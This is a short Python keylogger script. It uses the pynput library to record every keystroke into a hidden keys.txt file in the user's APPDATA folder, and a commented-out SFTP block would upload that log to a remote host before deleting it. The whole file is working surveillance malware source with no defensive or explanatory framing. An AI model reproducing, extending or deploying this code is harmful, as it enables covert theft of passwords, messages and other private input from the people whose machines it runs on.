import os
#import pysftp
from pynput import keyboard
from ftplib import FTP

appdata = os.getenv('APPDATA')
keylogs = appdata+'/keys.txt'

if os.path.exists(keylogs):
    f = open(keylogs, 'r')
    #with pysftp.Connection('hostname', username='', password='') as sftp:
    #    sftp.put(keylogs)
    f.close()
    os.remove(keylogs)
else:
    f = open(keylogs, 'w')

def on_press(key):
    f = open(keylogs, 'a')

    if type(key) == keyboard.Key:
        f.write(" <" + str(key) + "> ")
    else:
        f.write(key.char)

    f.close()

def on_release(key):
    if key == keyboard.Key.esc: 
        return False

with keyboard.Listener(
        on_press = on_press,
        on_release = on_release) as listener:
    listener.join()

listener = keyboard.Listener(
    on_press = on_press,
    on_release = on_release)

listener.start()